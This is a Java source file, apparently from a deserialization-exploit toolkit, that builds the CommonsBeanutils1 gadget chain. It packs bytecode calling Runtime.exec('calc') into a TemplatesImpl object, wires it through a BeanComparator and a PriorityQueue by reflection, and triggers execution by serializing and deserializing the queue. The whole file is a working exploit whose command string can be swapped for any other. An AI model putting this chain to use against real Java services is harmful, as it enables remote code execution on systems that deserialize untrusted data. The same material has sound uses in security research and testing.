package org.payload.commonsbeanutils;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.util.Collections;
import java.util.PriorityQueue;

import static org.Tools.setClassPool.evilClass2;
import static org.Tools.setFieldValue.setFieldValue;
import static org.Tools.setSerial.serial;
import static org.Tools.setTemplatesImpl.template;

public class CommonsBeanutils1 {
    public static void main(String[] args) throws Exception {
        byte[] evilClass = evilClass2("java.lang.Runtime.getRuntime().exec(\"calc\");");
        TemplatesImpl template = template(evilClass);
        final BeanComparator comparator0 = new BeanComparator();
        final BeanComparator comparator1 = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final BeanComparator comparator = new BeanComparator(null, Collections.reverseOrder());
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
//        queue.add("1");
//        queue.add("1");
        queue.add(1);
        queue.add(1);
        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{template, template});
        byte[] barr = serial(queue);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr));
        ois.readObject();
    }
}